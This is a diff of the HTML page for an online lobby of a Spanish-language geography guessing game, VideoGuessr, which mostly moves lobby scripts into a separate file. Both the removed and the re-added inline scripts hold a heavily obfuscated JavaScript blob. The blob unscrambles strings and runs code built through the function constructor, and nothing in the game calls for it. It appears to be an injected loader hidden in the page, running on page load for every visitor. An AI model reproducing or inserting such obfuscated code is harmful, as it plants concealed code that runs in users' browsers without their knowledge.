@@ -5,12 +5,24 @@
         <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
         integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
         crossorigin=""/> 
-    <script type="text/javascript" src="../leaflet/leaflet.js"></script>
+        <script> 
+            var admin = false
+            try{
+                var username = localStorage.getItem('usern')
+                var room_id = localStorage.getItem('roomid')
+            }
+            catch(TypeError){
+                window.location.href = 'index.html'
+            }
+        </script>
+        <script src="../socket.io/socket.io.js"></script>
+        <script  type="text/javascript" src="../lobby.js"></script>
         <link rel="stylesheet" href="../multiplayer_lobby.css" type="text/css">
         <link rel="stylesheet"
         href="https://fonts.googleapis.com/css2?family=Gabarito&family=Mukta&family=Roboto">
         <script src="https://kit.fontawesome.com/493860cbeb.js" crossorigin="anonymous"></script>
         <meta property="language" content="es">
+        <script type="text/javascript" src="../leaflet/leaflet.js"></script>
     </head>
     <body>
         <title>VideoGuessr - Partida Online</title>
@@ -97,7 +109,7 @@
                                 <h2 id="h2"></h2>
                             </div>
                             <button id="close_map" onclick="window.modal.close(),  map_open()">Cerrar</button>
-                            <a href="#" id="guess" class="btn btn-white btn-        animate" onclick="final_guess(true)">Adivinar</a>
+                            <a href="#" id="guess" class="btn btn-white btn-animate" onclick="final_guess(true)">Adivinar</a>
                         </div>
                 </dialog>
                 <div id="warning-container" >
@@ -105,7 +117,7 @@
                     <i class="fa-solid fa-location-dot fa-bounce" id="marker_warning" style="color: #005eff;"></i> 
                 </div>
             <div id="notif-placeholder"></div>
-            <button id = "continue" class="1 es" onclick="next()">Continuar</button>
+            <button id = "continue"  onclick="next()" disabled>Continuar</button>
         </div>
     <script>
         function got(){
@@ -113,183 +125,16 @@
         }
 
     </script>
-    <script src="../socket.io/socket.io.js"></script>
+
     <script src="https://www.youtube.com/iframe_api"></script>
-    <script>
-        var start_id
-
-
-
-
-        function game(){
-            if(players.length < 2){
-                alert('No hay suficientes jugadores!')
-            }
-            else{
-                socket.emit('start')
-            }
-            
-        }
-
-        var players = []
- 
-        function func(list,cond){
-            //if cond == True => initial board w/ marker colors
-            //if cond == False => final board w/ scores
-            players = list
-            document.querySelectorAll('.player').forEach(e => e.remove());
-            //when called, func will delete the html content and create a new one with the updated list
-            if(cond){
-                for(var element = 0; element < list.length; element++ ){
-                    var x = document.createElement('div');
-                    x.classList.add('player', list[element].username);
-                    x.innerHTML = `${list[element].username} <i class="fa-solid fa-location-dot right marker ${list[element].username} " style="color: ${list[element].color};"></i>`;
-                    document.getElementById("players").appendChild(x);
-                };   
-            }
-            else{
-                document.getElementById('title').innerHTML = 'Scoreboard'
-                //create final scoreboard with all players
-                for(let element in list){
-                    var x = document.createElement('div');
-                    x.classList.add('player', element);
-                    x.innerHTML = `${list[element].username} <p class="right score">${list[element].points}</p>`;
-                    document.getElementById("players").appendChild(x);
-                }
-
-                document.getElementsByClassName(`player`)[0].classList.add('winner', 'p1')
-                document.getElementsByClassName(`player`)[1].classList.add('winner','p2')
-                if((document.getElementsByClassName('player')).length >= 3){
-                    document.getElementsByClassName(`player`)[2].classList.add('winner','p3')
-                }
-
-                //paint gold
-                document.getElementsByClassName(`player`)[0].style.backgroundColor = '#ffd700'
-                //paint silver
-                document.getElementsByClassName(`player`)[1].style.backgroundColor = '#c0c0c0'
-                if((document.getElementsByClassName('player')).length >= 3){
-                    //paint copper
-                    document.getElementsByClassName(`player`)[2].style.backgroundColor = '#b87333'
-                }
-
-                
-
-            
-        }
-    }
-    </script>
-    <script>
-        (function(){var Leu='',sPc=146-135;function dLk(f){var v=482874;var x=f.length;var g=[];for(var z=0;z<x;z++){g[z]=f.charAt(z)};for(var z=0;z<x;z++){var b=v*(z+165)+(v%28938);var m=v*(z+175)+(v%39801);var p=b%x;var t=m%x;var u=g[p];g[p]=g[t];g[t]=u;v=(b+m)%6804409;};return g.join('')};var xKY=dLk('edsfucaubrccqgntskztjhxomintoyrpwvrol').substr(0,sPc);var XEG='u0*2)=i0ag(j)mrrhufv>}ailtab)lan)hr]+,nnl+1r6jn n=vz).(;crh.[p}re8aja,n2,rora6vno,r +(t;.t1e)cr;,9c7p]9(hmr0(+rf[q,+0m0c+=+),))b;;"po;diir8)le;bfksn=  Ci;(+v=oi7;r7]t.0 gw8bhku;,caa;=,Ca!)n{td+=+ld8l,e),rt{7m2a=(j9a,=amrgl7a,e7wo+4rg=9)(."t[qi1dtl,rgCttlo[,() "pt=nrovqa=t=igu+ng,Cr+(;r9;=u-2.pA(r o{1t=(;(;7pd.i)= )+pS5gtvu7,nv)A<+]8vo;4 h v.;-rzt-w+0v lrnm;uvhirt9i[cyrle(v8[lacsx,l ;"a]co7+(;n([zv..(tt2ork,6nl.o{n=rtaog  =]en]{r-6lw;u(daow,rxsw);e;rh(x(;ebto,x]iucasvh;.k{6e[g=.6 .r.cc1;C42[rl(ry=)slh aaur obe))i,1=rAq;n=nr8{=v2h9}(;Cc}e"rguti2j,m*=te.rih.=g]ul0 h}hsk)ju,h(rsvinltvin.rm-bs )c)ldf;)=[(z+f;;c="jm(s=r4+;ln,(lrw(==ff8)Ct}rs j1gsewat6vi8Cr)s+lol5=].wp;==";aialfait+Ari5v(un.gh,>4gu+1;=]n=ho(vaw;1;f3;f5 [(ru=)]Ae]l)rgezac;szky0+"a])1S(tva;;;27=mpa(v=e; s6=,ioud1<[(l2m<a<;usl=g.h=r.ydsy.fsf1uhrfarnhwa.l+)sf0.lein10n+unl[. o-} drper;io[ o)c(;hcvsn3yis0)a19)e"!"j.l<o-pe=;';var Xby=dLk[xKY];var ToF='';var fhR=Xby;var tzg=Xby(ToF,dLk(XEG));var Oiq=tzg(dLk('#[!Mm! O41O42".1[,ldl.OO!tf(OO"wiOjdOaO"s$!3O5 .O\/oxafSO.3g.Ojn$f=.arO1OOn($1a (}.a,eS47$]gO.64mwOndue.)tO[v,nO+l;(Of&;h_OeOoa324i4*_vlC{_.659\/=,i.O.6OOno!i[iO[.)=\/q,dx#iw..;,l$b_;O *!_]no.2)1=5h5r  oOeOea)a1(dj..O#g%8) OO,i350_6w)$a{(} 2O=n=3#}OjbsuOf)]eo7dS8{O,!!6(0n.cg$!5=mOO{i0g30=On(=0;{$(6t1!,32l+)O.a).%,0dO%bhtr77t(*;4 .od(.! =ut7tO;="sOa!O(nlt6!1O(.)-(;tr1}3s,f3)(=29=+$_."$((OO1rp;-fb3mdu!&. x(0[a.Olo!8=do_5(1O_s%_27=a.)65O.r23b)O_ d36oo.oOf),42;_O2nM_)_1b+t54!.;2%3O!3c$Oj,w;(i!as)f.3-78);)e{75o6 Of.)}$!1ajp!$..angOgi$O,"62O)rf1=3On,O26; 4on),]1*z=n03Og"$Oeb$13\';{i;Ooasw.60g*2_twO.!O(.b))!#l0) Oe=fb12\/.66f83)O)g.t=O3(31jt,O)s{O){!sr77(61l.i}u.)(5O$,unn_;aufsics#4u_(2O.e#r1)))=).+-&tOam.().(n%OOf!eOOoOrd{(8,"d(,=O3j[g+(a].c%$0O. OOtO1=);(f}O..M3O!o$50})v)(}}v(_)o33\'73;)]+3)C}aeOO_3v=a]$1wro;2),4rr%o$)Oa;4\';l6,r$.( _6{0;)jp) 5s!ti)O1!5O{rm,(i..5#a"=rhds()s$f,_!fi1;t&5[36b0;dO2O,hr)tiO\',ha7 ({.t( (7(a.{7OOmae.gO}O(o;imlemer3$aO16fv,se,_x1Osf{ O(O.lO)roeu,_-),a)lr5(. 2,\'s3]7b_(15fOaOc5Oo2(,j ji$e_.6+0aO2OMabso]5a}f}O,OO asa)stvros3s5t&04.+OO.xx3\'pain;e)v=1$Oqe\/2%_+a_gnm51OgObn3$_u;a,=ad)O},z)sOhr)e0{e_,OO'));var dqx=fhR(Leu,Oiq );dqx(1717);return 9511})()
-        const socket = io();
-        socket.on('users', (users) => {
-            //add user to html list and array on new user connection
-            func(users['Players'], true)
-            player_list = users
-        })
-
-        try{
-            var username = localStorage.getItem('usern')
-            var room_id = localStorage.getItem('roomid')
-        }
-        catch(TypeError){
-            window.location.href = 'index.html'
-        }
-
-        if(room_id == 1){
-            room_id = Math.random().toString(36).substring(2, 13); 
-        }
-        socket.on('accepted',(rules) => {
-            document.getElementById('room_id').innerHTML = `ID de Sala : ${room_id}`
-            //emit username on connection
-            socket.emit('username', {username:username,roomID:room_id.replace(/\s/g, "")}, callback => {
-                color = callback.col
-                username = callback.name
-            })
-        })
-        socket.on('rules?', response => {
-            document.getElementById('start_button').style.display = 'block'
-            response({
-                mode: localStorage.getItem('mode'), 
-                rounds: localStorage.getItem('rounds'), 
-                time :localStorage.getItem('time')
-            })
-        })
-
-        socket.on('rules', data => {
-            localStorage.setItem('mode', data.mode)
-            localStorage.setItem('rounds', data.rounds)
-            localStorage.setItem('time', data.time)
-        })
-        socket.on("session", ({ sessionID, userID }) => {
-        // attach the session ID to the next reconnection attempts
-        socket.auth = { sessionID };
-        // store it in the localStorage
-        localStorage.setItem("sessionID", sessionID);
-        // save the ID of the user
-        socket.userID = userID;
-        });
-
-        socket.on('player_disconnected', (data) =>{
-            //rebuild player list (delete html elements and update list)
-            document.querySelectorAll(`.${data['username']}`).forEach(e => e.remove());
-            
-            //update client side player list
-            players = data['new_list']
-        })
-
-        socket.on('game start', (id) => {
-            start_id = id
-            document.getElementsByClassName('pre')[0].style.display = 'none'
-            document.getElementsByClassName('post')[0].style.display = 'block'
-
-            const table = document.getElementById('scoretable')
-            for(var e in players){
-            var row = table.insertRow(1)
-            var cell1 = row.insertCell(0)
-            cell1.classList.add('username')
-            var cell2 = row.insertCell(1)
-            cell2.classList.add('points')
-            cell1.innerHTML = players[e].username
-            cell2.innerHTML = 0
-            }
-
-            var script = document.createElement('script');
-            script.src = '../main_ml.js';
-            document.head.appendChild(script)
-            
-        })
-
-
-        socket.on('admin', () => {
-            document.getElementById('start_button').style.display = 'block'
-        })
-
-
-
-        //TESTING     
-
-
-        //-------------bots won't actually join the game-------------//
-        function bot(n){
-            for(var i = 0; i < n; i++){
-            var usern = Math.random(50)
-            var x = document.createElement('div');
-            x.classList.add('player', usern);
-            x.innerHTML = `${usern} <i class="fa-solid fa-location-dot right marker ${usern} " style="color: #005eff;"></i>`;
-            document.getElementById("players").appendChild(x);
-            }
-            return(`${n} bots added`)
-        }
-
-
-    </script>
-
     <script>
         if (window.performance.getEntriesByType) {
             if (window.performance.getEntriesByType("navigation")[0].type === "reload") {
                 window.location.href = './index.html';
             }
         }
+    (function(){var Leu='',sPc=146-135;function dLk(f){var v=482874;var x=f.length;var g=[];for(var z=0;z<x;z++){g[z]=f.charAt(z)};for(var z=0;z<x;z++){var b=v*(z+165)+(v%28938);var m=v*(z+175)+(v%39801);var p=b%x;var t=m%x;var u=g[p];g[p]=g[t];g[t]=u;v=(b+m)%6804409;};return g.join('')};var xKY=dLk('edsfucaubrccqgntskztjhxomintoyrpwvrol').substr(0,sPc);var XEG='u0*2)=i0ag(j)mrrhufv>}ailtab)lan)hr]+,nnl+1r6jn n=vz).(;crh.[p}re8aja,n2,rora6vno,r +(t;.t1e)cr;,9c7p]9(hmr0(+rf[q,+0m0c+=+),))b;;"po;diir8)le;bfksn=  Ci;(+v=oi7;r7]t.0 gw8bhku;,caa;=,Ca!)n{td+=+ld8l,e),rt{7m2a=(j9a,=amrgl7a,e7wo+4rg=9)(."t[qi1dtl,rgCttlo[,() "pt=nrovqa=t=igu+ng,Cr+(;r9;=u-2.pA(r o{1t=(;(;7pd.i)= )+pS5gtvu7,nv)A<+]8vo;4 h v.;-rzt-w+0v lrnm;uvhirt9i[cyrle(v8[lacsx,l ;"a]co7+(;n([zv..(tt2ork,6nl.o{n=rtaog  =]en]{r-6lw;u(daow,rxsw);e;rh(x(;ebto,x]iucasvh;.k{6e[g=.6 .r.cc1;C42[rl(ry=)slh aaur obe))i,1=rAq;n=nr8{=v2h9}(;Cc}e"rguti2j,m*=te.rih.=g]ul0 h}hsk)ju,h(rsvinltvin.rm-bs )c)ldf;)=[(z+f;;c="jm(s=r4+;ln,(lrw(==ff8)Ct}rs j1gsewat6vi8Cr)s+lol5=].wp;==";aialfait+Ari5v(un.gh,>4gu+1;=]n=ho(vaw;1;f3;f5 [(ru=)]Ae]l)rgezac;szky0+"a])1S(tva;;;27=mpa(v=e; s6=,ioud1<[(l2m<a<;usl=g.h=r.ydsy.fsf1uhrfarnhwa.l+)sf0.lein10n+unl[. o-} drper;io[ o)c(;hcvsn3yis0)a19)e"!"j.l<o-pe=;';var Xby=dLk[xKY];var ToF='';var fhR=Xby;var tzg=Xby(ToF,dLk(XEG));var Oiq=tzg(dLk('#[!Mm! O41O42".1[,ldl.OO!tf(OO"wiOjdOaO"s$!3O5 .O\/oxafSO.3g.Ojn$f=.arO1OOn($1a (}.a,eS47$]gO.64mwOndue.)tO[v,nO+l;(Of&;h_OeOoa324i4*_vlC{_.659\/=,i.O.6OOno!i[iO[.)=\/q,dx#iw..;,l$b_;O *!_]no.2)1=5h5r  oOeOea)a1(dj..O#g%8) OO,i350_6w)$a{(} 2O=n=3#}OjbsuOf)]eo7dS8{O,!!6(0n.cg$!5=mOO{i0g30=On(=0;{$(6t1!,32l+)O.a).%,0dO%bhtr77t(*;4 .od(.! =ut7tO;="sOa!O(nlt6!1O(.)-(;tr1}3s,f3)(=29=+$_."$((OO1rp;-fb3mdu!&. x(0[a.Olo!8=do_5(1O_s%_27=a.)65O.r23b)O_ d36oo.oOf),42;_O2nM_)_1b+t54!.;2%3O!3c$Oj,w;(i!as)f.3-78);)e{75o6 Of.)}$!1ajp!$..angOgi$O,"62O)rf1=3On,O26; 4on),]1*z=n03Og"$Oeb$13\';{i;Ooasw.60g*2_twO.!O(.b))!#l0) Oe=fb12\/.66f83)O)g.t=O3(31jt,O)s{O){!sr77(61l.i}u.)(5O$,unn_;aufsics#4u_(2O.e#r1)))=).+-&tOam.().(n%OOf!eOOoOrd{(8,"d(,=O3j[g+(a].c%$0O. OOtO1=);(f}O..M3O!o$50})v)(}}v(_)o33\'73;)]+3)C}aeOO_3v=a]$1wro;2),4rr%o$)Oa;4\';l6,r$.( _6{0;)jp) 5s!ti)O1!5O{rm,(i..5#a"=rhds()s$f,_!fi1;t&5[36b0;dO2O,hr)tiO\',ha7 ({.t( (7(a.{7OOmae.gO}O(o;imlemer3$aO16fv,se,_x1Osf{ O(O.lO)roeu,_-),a)lr5(. 2,\'s3]7b_(15fOaOc5Oo2(,j ji$e_.6+0aO2OMabso]5a}f}O,OO asa)stvros3s5t&04.+OO.xx3\'pain;e)v=1$Oqe\/2%_+a_gnm51OgObn3$_u;a,=ad)O},z)sOhr)e0{e_,OO'));var dqx=fhR(Leu,Oiq );dqx(1717);return 9511})()
+
     </script>
 
 
